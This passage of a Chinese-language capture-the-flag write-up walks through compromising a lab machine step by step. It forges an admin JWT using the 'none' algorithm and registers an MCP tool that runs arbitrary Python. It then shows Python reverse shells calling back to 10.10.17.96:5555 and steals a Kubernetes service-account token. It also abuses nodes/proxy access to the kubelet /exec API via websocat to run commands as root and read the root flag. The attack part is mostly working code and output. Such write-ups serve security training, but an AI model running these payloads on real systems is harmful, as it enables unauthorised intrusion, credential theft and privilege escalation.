    "POST /mcp                        [MCP JSON-RPC 2.0]",
    "POST /api/v1/auth",
    "GET  /api/v1/tools",
    "POST /api/v1/tools               [admin]"
  ]
}
```

认证是通过 JWT 的（存放在 Authorization 头字段中），并且 JWT 的验签算法支持两种：

- HS256
- none

`endpoints` 中，还列举了能访问的端点以及对应的请求方式。其中：

```
POST /api/v1/tools
```

只允许 admin 访问。

先用已知账密访问 `auth` 进行认证。

根据 API 文档：

```json
{
  "post": {
    "summary": "Authenticate",
    "operationId": "authenticate_api_v1_auth_post",
    "requestBody": {
      "content": {
        "application/json": {
          "schema": {
            "$ref": "#/components/schemas/AuthRequest"
          }
        }
      },
      "required": true
    },
	[snip]
  }
}


 "components": {
    "schemas": {
      "AuthRequest": {
        "properties": {
          "username": {
            "type": "string",
            "title": "Username"
          },
          "password": {
            "type": "string",
            "title": "Password"
          }
        },
        "type": "object",
        "required": [
          "username",
          "password"
        ],
        "title": "AuthRequest"
      },
```

构造合法请求：

```bash
nightfall@fireflow:~/.mcp$ curl http://10.129.58.134:30080/api/v1/auth -X POST --json '{"username": "langflow-bot", "password": "Langfl0w@mcp2026!"}' -s | jq
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps",
  "token_type": "bearer"
}
```

返回了 JWT，并且根据其 signature 部分存在，知道其默认使用 HS256 作为验签算法。

写个脚本解码 JWT：

```python
import base64, json

token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps'

header, payload, signature = token.split('.')

def decode(seg):
    seg += "=" * (-len(seg) % 4)
    return json.loads(base64.urlsafe_b64decode(seg))

print(json.dumps(decode(header)))
print(json.dumps(decode(payload)))
```

运行：

```bash
python decode_jwt.py | jq
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "sub": "langflow-bot",
  "role": "user"
}
```

由于支持 none 验签算法，我可以伪造一个合法的管理员 JWT：

```python
import base64

header = '{"alg": "none","typ": "JWT"}'
payload = '{"sub": "langflow-bot","role": "admin"}'

def encode(seg):
    return base64.urlsafe_b64encode(seg.encode()).rstrip(b"=").decode()

jwt = encode(header) + '.' + encode(payload) + '.'

print(jwt)
```

运行：

```bash
python admin.py
eyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ.eyJzdWIiOiAibGFuZ2Zsb3ctYm90Iiwicm9sZSI6ICJhZG1pbiJ9.
```

查看 `/api/v1/tools` 的作用是什么：

```json
{
  "post": {
    "summary": "Register Tool",
    "operationId": "register_tool_api_v1_tools_post",
    "requestBody": {
      "content": {
        "application/json": {
          "schema": {
            "$ref": "#/components/schemas/ToolRegisterRequest"
          }
        }
      },
      "required": true
    }
  }
}

  "components": {
    "schemas": {
      "ToolRegisterRequest": {
        "properties": {
          "name": {
            "type": "string",
            "title": "Name"
          },
          "description": {
            "type": "string",
            "title": "Description"
          },
          "inputSchema": {
            "anyOf": [
              {
                "additionalProperties": true,
                "type": "object"
              },
              {
                "type": "null"
              }
            ],
            "title": "Inputschema"
          },
          "code": {
            "type": "string",
            "title": "Code"
          }
        },
        "type": "object",
        "required": [
          "name",
          "description",
          "code"
        ],
        "title": "ToolRegisterRequest"
      },
    },
  }
```

这是一个工具注册 API，三个必要参数：

- `name`
- `description`
- `code`

尝试创建一个工具：

```bash
nightfall@fireflow:~/.mcp$ curl http://10.129.58.134:30080/api/v1/tools -X POST -H 'Authorization: Bearer eyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ.eyJzdWIiOiAibGFuZ2Zsb3ctYm90Iiwicm9sZSI6ICJhZG1pbiJ9.' --json '{"name":"test","description":"test","code":"whoami"}'
```

查看工具列表：

```bash
nightfall@fireflow:~/.mcp$ curl http://10.129.58.134:30080/api/v1/tools -H 'Authorization: Bearer eyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ.eyJzdWIiOiAibGFuZ2Zsb3ctYm90Iiwicm9sZSI6ICJhZG1pbiJ9.' | jq
[
  {
    "name": "ping_host",
    "description": "Ping a target host 3 times and return ICMP output."
  },
  {
    "name": "get_metrics_summary",
    "description": "Return a summary of system memory and load average from /proc."
  },
  {
    "name": "list_running_tasks",
    "description": "List the top 20 running processes sorted by CPU usage."
  },
  {
    "name": "test",
    "description": "test"
  }
]
```

工具已经存在。

调用工具：

```bash
nightfall@fireflow:~/.mcp$ curl http://10.129.58.134:30080/mcp -X POST -H 'Authorization: Bearer eyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ.eyJzdWIiOiAibGFuZ2Zsb3ctYm90Iiwicm9sZSI6ICJhZG1pbiJ9.' --json '{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "test",
    "arguments": {}
  },
  "id": 4
}' | jq

{
  "jsonrpc": "2.0",
  "id": 4,
  "result": {
    "content": [
      {
        "type": "text",
        "text": "\nTraceback (most recent call last):\n  File \"<string>\", line 1, in <module>\nNameError: name 'whoami' is not defined\n"
      }
    ],
    "isError": true
  }
}
```

这个报错信息（`text` 的值）通常出现在 Python 中，输入的系统命令 `whoami` 不是一个 Python 内置的变量、函数或命令，就会抛出 `NameError: name 'whoami' is not defined`（名称错误）。

通过 python 交互式界面验证：

```bash
python
Python 3.13.5 (main, May  5 2026, 21:05:52) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> whoami
Traceback (most recent call last):
  File "<python-input-0>", line 1, in <module>
    whoami
NameError: name 'whoami' is not defined
>>>
```

确实如此。

尝试将 code 改为 python 命令：

```bash
nightfall@fireflow:~/.mcp$ curl http://10.129.58.134:30080/api/v1/tools -X POST -H 'Authorization: Bearer eyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ.eyJzdWIiOiAibGFuZ2Zsb3ctYm90Iiwicm9sZSI6ICJhZG1pbiJ9.' --json '{"name":"test","description":"test","code":"import os; os.system(\"whoami\")"}'
```

再次调用 test 工具：

```bash
nightfall@fireflow:~/.mcp$ curl http://10.129.58.134:30080/mcp -X POST -H 'Authorization: Bearer eyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ.eyJzdWIiOiAibGFuZ2Zsb3ctYm90Iiwicm9sZSI6ICJhZG1pbiJ9.' --json '{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "test",
    "arguments": {}
  },
  "id": 4
}' -s | jq
{
  "jsonrpc": "2.0",
  "id": 4,
  "result": {
    "content": [
      {
        "type": "text",
        "text": "mcp\n"
      }
    ],
    "isError": false
  }
}
```

成功执行系统命令。

## 八、Root Flag

### 1、mcp shell

尝试反弹 Shell：

```bash
nightfall@fireflow:~/.mcp$ curl http://10.129.58.134:30080/api/v1/tools -X POST -H 'Authorization: Bearer eyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ.eyJzdWIiOiAibGFuZ2Zsb3ctYm90Iiwicm9sZSI6ICJhZG1pbiJ9.' --json '{"name":"test","description":"test","code":"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.17.96\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")"}'
```

本地监听 5555 端口：

```bash
nc -lvnp 5555
Listening on 0.0.0.0 5555
```

调用工具：

```bash
nightfall@fireflow:~/.mcp$ curl http://10.129.58.134:30080/mcp -X POST -H 'Authorization: Bearer eyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ.eyJzdWIiOiAibGFuZ2Zsb3ctYm90Iiwicm9sZSI6ICJhZG1pbiJ9.' --json '{                                                                                                                      "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "test",
    "arguments": {}
  },
  "id": 4
}'
```

成功获得 mcp shell：

```bash
nc -lvnp 5555
Listening on 0.0.0.0 5555
Connection received on 10.129.58.134 2833
mcp@mcp-server-54464cb475-29ztf:/app$
```

但是，我发现，不过一会儿，这个 shell 就会断掉。

而且，当我再次检查工具列表的时候，发现 test 工具已经不见了。

可能的原因：目标只是临时开一个终端，运行命令结束/超时之后，就会将终端关闭，这会导致反弹回来的 shell 也被中断。

优化一下 python 代码，最常见的做法是“将普通进程转变成守护进程”：

```python
import socket
import os
import pty
import sys


# 第一次 fork，父进程退出
pid = os.fork()
if pid > 0:
    sys.exit(0)

# 创建新会话，脱离控制终端
os.setsid()

# 第二次 fork，彻底 daemonize
pid = os.fork()
if pid > 0:
    sys.exit(0)

# 创建 socket 并反向连接攻击者
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.17.96", 5555))

# 将标准输入、输出、错误重定向到 socket
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# 启动带 PTY 的交互式 Shell
pty.spawn("/bin/sh")
```

重新注册工具：

```bash
nightfall@fireflow:~/.mcp$ curl http://10.129.58.134:30080/api/v1/tools -X POST -H 'Authorization: Bearer eyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ.eyJzdWIiOiAibGFuZ2Zsb3ctYm90Iiwicm9sZSI6ICJhZG1pbiJ9.' --json '{"name":"test","description":"test","code":"import socket\nimport os\nimport pty\nimport sys\n\n\npid = os.fork()\nif pid > 0:\n    sys.exit(0)\n\nos.setsid()\n\npid = os.fork()\nif pid > 0:\n    sys.exit(0)\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((\"10.10.17.96\", 5555))\n\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\n\npty.spawn(\"/bin/sh\")"}'
```

调用工具：

```bash
nightfall@fireflow:~/.mcp$ curl http://10.129.58.134:30080/mcp -X POST -H 'Authorization: Bearer eyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ.eyJzdWIiOiAibGFuZ2Zsb3ctYm90Iiwicm9sZSI6ICJhZG1pbiJ9.' --json '{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "test",
    "arguments": {}
  },
  "id": 4
}'
```

查看监听：

```bash
nc -lvnp 5555
Listening on 0.0.0.0 5555
Connection received on 10.129.58.134 12246
$ whoami
whoami
mcp
```

mcp shell 成功获得。

### 2、信息搜集

很多命令都没有：

```bash
$ sudo -l
sudo -l
/bin/sh: 4: sudo: not found
$ ss
ss
/bin/sh: 5: ss: not found
$ ps
ps
/bin/sh: 6: ps: not found
```

应该是处于一个简易容器当中。

能发现内核是 Ubuntu 编译的 Linux 6.8：

```bash
mcp@mcp-server-54464cb475-29ztf:/$ uname -a
Linux mcp-server-54464cb475-29ztf 6.8.0-111-generic #111-Ubuntu SMP PREEMPT_DYNAMIC Sat Apr 11 23:16:02 UTC 2026 x86_64 GNU/Linux
```

但是，当前根文件系统中的发行版显示的是 Debian：

```bash
mcp@mcp-server-54464cb475-29ztf:/$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 13 (trixie)"
NAME="Debian GNU/Linux"
VERSION_ID="13"
VERSION="13 (trixie)"
VERSION_CODENAME=trixie
DEBIAN_VERSION_FULL=13.4
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

从环境变量中，能找到 K8s（[Kubernetes](https://kubernetes.io/zh-cn/docs/concepts/overview/)）的痕迹：

```bash
mcp@mcp-server-54464cb475-29ztf:/$ env
KUBERNETES_SERVICE_PORT_HTTPS=443
PYTHON_SHA256=272179ddd9a2e41a0fc8e42e33dfbdca0b3711aa5abf372d3f2d51543d09b625
KUBERNETES_SERVICE_PORT=443
HOSTNAME=mcp-server-54464cb475-29ztf
PYTHON_VERSION=3.11.15
PWD=/
MCP_SERVER_SERVICE_HOST=10.43.250.195
MCP_SERVER_SERVICE_PORT=8080
HOME=/home/mcp
MCP_SERVER_PORT_8080_TCP_PROTO=tcp
LANG=C.UTF-8
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.7z=01;31:*.ace=01;31:*.alz=01;31:*.apk=01;31:*.arc=01;31:*.arj=01;31:*.bz=01;31:*.bz2=01;31:*.cab=01;31:*.cpio=01;31:*.crate=01;31:*.deb=01;31:*.drpm=01;31:*.dwm=01;31:*.dz=01;31:*.ear=01;31:*.egg=01;31:*.esd=01;31:*.gz=01;31:*.jar=01;31:*.lha=01;31:*.lrz=01;31:*.lz=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.lzo=01;31:*.pyz=01;31:*.rar=01;31:*.rpm=01;31:*.rz=01;31:*.sar=01;31:*.swm=01;31:*.t7z=01;31:*.tar=01;31:*.taz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tgz=01;31:*.tlz=01;31:*.txz=01;31:*.tz=01;31:*.tzo=01;31:*.tzst=01;31:*.udeb=01;31:*.war=01;31:*.whl=01;31:*.wim=01;31:*.xz=01;31:*.z=01;31:*.zip=01;31:*.zoo=01;31:*.zst=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.jxl=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.crdownload=00;90:*.dpkg-dist=00;90:*.dpkg-new=00;90:*.dpkg-old=00;90:*.dpkg-tmp=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:*.swp=00;90:*.tmp=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
MCP_SERVER_PORT_8080_TCP_PORT=8080
MCP_SERVER_PORT_8080_TCP_ADDR=10.43.250.195
TERM=xterm
SHLVL=1
MCP_SERVER_PORT=tcp://10.43.250.195:8080
KUBERNETES_PORT_443_TCP_PROTO=tcp
MCP_SERVER_SERVICE_PORT_HTTP=8080
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
MCP_SERVER_PORT_8080_TCP=tcp://10.43.250.195:8080
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
OLDPWD=/home/mcp
_=/usr/bin/env
```

> K8s，一个用于管理容器的开源平台。

其中，环境变量 `KUBERNETES_PORT` 展示了 Kubernetes API Server 的连接地址：

```
KUBERNETES_PORT=tcp://10.43.0.1:443
```

在 Kubernetes 中，最小的处理单位为 Pod。当前容器由 Kubernetes 管理，可推断出它处于一个 Pod 中。

[官方文档](https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/)描述了“从 Pod 内部访问 API Server”的方法，共三种，我选择了“直接通过 REST API 访问”。

首先，确认存储在本地的身份认证信息：

```bash
mcp@mcp-server-54464cb475-29ztf:/app$ cat /var/run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6ImFQRTZ5R3JrSUpadmdid19HcHBTRTBYUFJZWUxqeGcxUHJIaFJjTEVSdm8ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODE1Nzg2NDE3LCJpYXQiOjE3ODQyNTA0MTcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZTg2Y2FkOGEtZWM4ZC00M2I3LTkzNjAtMDQyZDAxMmY2ZDk5Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZmlyZWZsb3ciLCJ1aWQiOiI4NzI5MTU4OC0wMTc4LTRlNDItYTk5OC00MWE1MmZhNzNiOGUifSwicG9kIjp7Im5hbWUiOiJtY3Atc2VydmVyLTU0NDY0Y2I0NzUtMjl6dGYiLCJ1aWQiOiI3MDJhZmViYi00ZjUxLTRlZDUtYWE5OC1hYjZiMjU1M2E3MjgifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6Im1jcC1zYSIsInVpZCI6ImE1MzRmNTUxLWIyYjEtNGU2Ni1iZGE1LWU5YjVlMmE1NjAyYyJ9LCJ3YXJuYWZ0ZXIiOjE3ODQyNTQwMjR9LCJuYmYiOjE3ODQyNTA0MTcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0Om1jcC1zYSJ9.quBCzMtYe9cTu1I2p0N7QlELB2en7QEKW33V1P1-I3L87BnB0Qmj3tE2NXYsMnsond94DV4XaYpOJJMw_8UWwD5M9IiIMwopp4_-VvMnBdj_BFgIiKwZrL4t-2WvNt6Dowr2tP6LZ0lN2t0A8m_eEHGadiEJOaTp52PbQVMWXjrLHnFRA5pKcg5OYczgBb-c2wTQunvD1eqva6wVoEYfBr1u5Hhapm93gZpsrMVgDysRVcWAeVEpfCVP0Q-XqubVwG2TurFmUIh9r21jHV42ydI7JLptESPxQVvw-KMFeew6oKDFnBPEvInddCwUZRa_GC7CKNuy2VlrZwABRf1p4A
```

由于信息很长，用临时变量存储其值：

```bash
mcp@mcp-server-54464cb475-29ztf:/app$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

需要将此 Token 作为 Bearer Token 传递给 API Server：

```bash
mcp@mcp-server-54464cb475-29ztf:/app$ curl https://10.43.0.1 -k -H "Authorization: Bearer $TOKEN" -I
HTTP/2 403
audit-id: b1651579-22dd-40ef-ab44-375abd117d15
cache-control: no-cache, private
content-type: application/json
x-content-type-options: nosniff
x-kubernetes-pf-flowschema-uid: 9d2500c1-3df3-40cf-8a89-f51b067ed0c1
x-kubernetes-pf-prioritylevel-uid: cc23de33-dbbc-466f-b96c-5dc4dbb8bb74
content-length: 238
date: Fri, 17 Jul 2026 01:26:55 GMT
```

403 响应，无权限访问。

Kubernetes 提供了一个权限查询 API：`SelfSubjectRulesReview`

作用：列出当前用户在特定 Namespace 内可以执行的所有操作集合（即权限列表）。

查询：

```bash
mcp@mcp-server-54464cb475-29ztf:/app$ curl https://10.43.0.1/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -k -H "Authorization: Bearer $TOKEN" -X POST --json '{"apiVersion":"authorization.k8s.io/v1","kind": "SelfSubjectRulesReview","spec": {"namespace": "default"}}'
{
  "kind": "SelfSubjectRulesReview",
  "apiVersion": "authorization.k8s.io/v1",
  "metadata": {},
  "spec": {},
  "status": {
    "resourceRules": [
      {
        "verbs": [
          "create"
        ],
        "apiGroups": [
          "authorization.k8s.io"
        ],
        "resources": [
          "selfsubjectaccessreviews",
          "selfsubjectrulesreviews"
        ]
      },
      {
        "verbs": [
          "create"
        ],
        "apiGroups": [
          "authentication.k8s.io"
        ],
        "resources": [
          "selfsubjectreviews"
        ]
      },
      {
        "verbs": [
          "get"
        ],
        "apiGroups": [
          ""
        ],
        "resources": [
          "nodes/proxy"
        ]
      }
    ],
    "nonResourceRules": [
      {
        "verbs": [
          "get"
        ],
        "nonResourceURLs": [
          "/api",
          "/api/*",
          "/apis",
          "/apis/*",
          "/healthz",
          "/livez",
          "/openapi",
          "/openapi/*",
          "/readyz",
          "/version",
          "/version/"
        ]
      },
      {
        "verbs": [
          "get"
        ],
        "nonResourceURLs": [
          "/healthz",
          "/livez",
          "/readyz",
          "/version",
          "/version/"
        ]
      },
      {
        "verbs": [
          "get"
        ],
        "nonResourceURLs": [
          "/.well-known/openid-configuration",
          "/.well-known/openid-configuration/",
          "/openid/v1/jwks",
          "/openid/v1/jwks/"
        ]
      }
    ],
    "incomplete": false
  }
}
```

分为资源类和非资源类两大板块。

我让 AI 根据权限信息，区分了一下哪些权限属于默认授予，哪些属于额外授予：

![[file-20260717095439407.png]]

直接 Google 关键词，即可看到 RCE 的字样：

![[file-20260717095654605.png]]

### 3、nodes/proxy

在 Kubernetes 中，Node 是运行 Pod 的实际工作机器，其内部会运行一个叫 kubelet 的组件，该组件也被称为“节点代理（Node Proxy）”，其作用是确保 Pod 的正常运行，相当于管理员的作用。

而 `nodes/proxy` 权限，用于与 kubelet 组件进行交互。

官方提供两种交互方式：

- **API Server Proxy**： 通过控制面 API Server（路径为 `/api/v1/nodes/{node_name}/proxy/...`）将请求安全地代理转发至目标 Node 的 Kubelet。
- **直接访问 Kubelet API**：Kubelet 自身公开了各种 API 接口，包括常规的 `/metrics`、`/stats`，以及执行命令和调试高危接口（如 `/exec`、`/run`、`/attach` 和 `/portforward`）。因此，可以直接与部署在 Node 上的 Kubelet 服务（通常在 `10250` 端口）进行通信。

像 `/exec` 或 `/run` 这类用于交互式命令执行的 API，需要通过 WebSocket 协议实现双向实时流式通信。根据 WebSocket 规范，建立连接的第一步必须是发送一个带有协议升级头部的 `HTTP GET` 握手请求。

但是，Kubelet **仅**针对这个初始的 `GET` 请求做鉴权操作，若权限通过，则允许协议升级，后续在该通道上的命令执行操作并不会再次进行鉴权。

简单说，用户只需要拥有对 `/exec` 的 GET 权限，即可实现命令执行。

这个和 `nodes/proxy` 有什么关系呢？

在 Kubernetes 中，`/exec` 没有特定的 kubelet API 前缀，而根据官方的表格：

![[file-20260717114003847.png]]

没有专属前缀的资源都会被分配到 `nodes/proxy` 的子资源当中。

因此，对 `/exec` 的 GET 检查，就相当于对 `nodes/proxy` 的 GET 检查。

当前用户刚好有对 `nodes/proxy` 的 GET 操作：

```json
"verbs": [
  "get"
],
"apiGroups": [
  ""
],
"resources": [
  "nodes/proxy"
]
```

对于 `/exec` API，需要使用安全 WebSocket 连接（`wss://`），其请求路径：

```
wss://10.129.59.145:10250/exec/{namespace}/{pod_name}/{container_name}?output=1&error=1&command={……}
```

携带 `output=1` 和 `error=1` 是为了开启容器的输出/错误流通道（如果需要交互式，还需要带上 `stdin=1`）。

还有个细节，Kubelet 不会在 shell 中解析整行命令，因此需要将待执行的命令及其参数拆分为多个独立的 `command` 参数进行拼接，比如要执行：

```bash
cat /host/root/root/root.txt
```

就要将其拆分成：

```
command=cat&command=%2Fhost%2Froot%2Froot%2Froot.txt
```

在调用 API 之前，还需要确认三个未知值：

- `namespace`
- `pod_name`
- `container_name`

查询 Kubelet 的 `/pods` 接口，Kubelet 会返回一个包含该 Node 上所有运行中 Pod 详细信息的 JSON 数据：

```bash
curl https://10.129.59.145:10250/pods -k -H "Authorization: Bearer $TOKEN"
```

找高权限用户启动的容器，检索“Privileged”：

![[file-20260717153440153.png]]

在其附近就能找全：

```
namespcae: monitoring
pod_name: prometheus-prometheus-node-exporter-nmntq
container_name: node-exporter
```

目标没有 websocat 命令：

```bash
mcp@mcp-server-54464cb475-29ztf:/tmp$ websocat
bash: websocat: command not found
```

在之前的 nightfall shell 中有：

```bash
nightfall@fireflow:/tmp$ which websocat
/usr/local/bin/websocat
```

复制到 `/tmp` 目录下：

```bash
cp /usr/local/bin/websocat /tmp
```

在 `/tmp` 目录中，使用 Python 开个简易的 Web 服务：

```bash
nightfall@fireflow:/tmp$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

mcp shell 上下载 `websocat` 二进制文件，并且赋予执行权限：

```bash
mcp@mcp-server-54464cb475-29ztf:/tmp$ curl http://10.129.59.145:8000/websocat -o websocat
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 7661k  100 7661k    0     0  74.2M      0 --:--:-- --:--:-- --:--:-- 74.8M
mcp@mcp-server-54464cb475-29ztf:/tmp$ ls
websocat
mcp@mcp-server-54464cb475-29ztf:/tmp$ chmod +x websocat
```

验证命令执行：

```bash
mcp@mcp-server-54464cb475-29ztf:/tmp$ ./websocat -t -k "wss://10.129.59.145:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&error=1&command=whoami" --header "Authorization: Bearer $TOKEN" --header "Sec-WebSocket-Protocol: v4.channel.k8s.io"

root
{"metadata":{},"status":"Success"}
```

命令执行成功，且为 root 权限。

本题的 root flag 是存储在宿主机的 root 目录下：

```bash
mcp@mcp-server-54464cb475-29ztf:/tmp$ ./websocat -t -k "wss://10.129.59.145:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&error=1&command=find&command=%2f&command=%2dname&command=root%2etxt" --header "Authorization: Bearer $TOKEN" --header "Sec-WebSocket-Protocol: v4.channel.k8s.io"

/host/root/root/root.txt
```

查看：

```bash
mcp@mcp-server-54464cb475-29ztf:/tmp$ ./websocat -t -k "wss://10.129.59.145:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&error=1&command=cat&command=%2Fhost%2Froot%2Froot%2Froot.txt" --header "Authorization: Bearer $TOKEN" --header "Sec-WebSocket-Protocol: v4.channel.k8s.io"

a8858**********************
{"metadata":{},"status":"Success"}
```

## 附录

```json
{"files":[],"data":{"nodes":[{"id":"ChatOutput-wI5df","type":"genericNode","position":{"x":763.0175089593382,"y":821.6624906388676},"data":{"node":{"template":{"_type":"Component","input_value":{"trace_as_metadata":true,"list":false,"list_add_label":"Add More","override_skip":false,"required":true,"placeholder":"","show":true,"name":"input_value","value":"","display_name":"Inputs","advanced":false,"input_types":["Data","DataFrame","Message"],"dynamic":false,"info":"Message to be passed as output.","title_case":false,"track_in_telemetry":false,"type":"other","_input_type":"HandleInput"},"clean_data":{"tool_mode":false,"trace_as_metadata":true,"list":false,"list_add_label":"Add More","override_skip":false,"required":false,"placeholder":"","show":true,"name":"clean_data","value":true,"display_name":"Basic Clean Data","advanced":true,"dynamic":false,"info":"Whether to clean data before converting to string.","title_case":false,"track_in_telemetry":true,"type":"bool","_input_type":"BoolInput"},"code":{"type":"code","required":true,"placeholder":"","list":false,"show":true,"multiline":true,"value":"from collections.abc import Generator\nfrom typing import Any\n\nimport orjson\nfrom fastapi.encoders import jsonable_encoder\n\nfrom lfx.base.io.chat import ChatComponent\nfrom lfx.helpers.data import safe_convert\nfrom lfx.inputs.inputs import BoolInput, DropdownInput, HandleInput, MessageTextInput\nfrom lfx.schema.data import Data\nfrom lfx.schema.dataframe import DataFrame\nfrom lfx.schema.message import Message\nfrom lfx.schema.properties import Source\nfrom lfx.template.field.base import Output\nfrom lfx.utils.constants import (\n    MESSAGE_SENDER_AI,\n    MESSAGE_SENDER_NAME_AI,\n    MESSAGE_SENDER_USER,\n)\n\n\nclass ChatOutput(ChatComponent):\n    display_name = \"Chat Output\"\n    description = \"Display a chat message in the Playground.\"\n    documentation: str = \"https://docs.langflow.org/chat-input-and-output\"\n    icon = \"MessagesSquare\"\n    name = \"ChatOutput\"\n    minimized = True\n\n    inputs = [\n        HandleInput(\n            name=\"input_value\",\n            display_name=\"Inputs\",\n            info=\"Message to be passed as output.\",\n            input_types=[\"Data\", \"DataFrame\", \"Message\"],\n            required=True,\n        ),\n        BoolInput(\n            name=\"should_store_message\",\n            display_name=\"Store Messages\",\n            info=\"Store the message in the history.\",\n            value=True,\n            advanced=True,\n        ),\n        DropdownInput(\n            name=\"sender\",\n            display_name=\"Sender Type\",\n            options=[MESSAGE_SENDER_AI, MESSAGE_SENDER_USER],\n            value=MESSAGE_SENDER_AI,\n            advanced=True,\n            info=\"Type of sender.\",\n        ),\n        MessageTextInput(\n            name=\"sender_name\",\n            display_name=\"Sender Name\",\n            info=\"Name of the sender.\",\n            value=MESSAGE_SENDER_NAME_AI,\n            advanced=True,\n        ),\n        MessageTextInput(\n            name=\"session_id\",\n            display_name=\"Session ID\",\n            info=\"The session ID of the chat. If empty, the current session ID parameter will be used.\",\n            advanced=True,\n        ),\n        MessageTextInput(\n            name=\"context_id\",\n            display_name=\"Context ID\",\n            info=\"The context ID of the chat. Adds an extra layer to the local memory.\",\n            value=\"\",\n            advanced=True,\n        ),\n        MessageTextInput(\n            name=\"data_template\",\n            display_name=\"Data Template\",\n            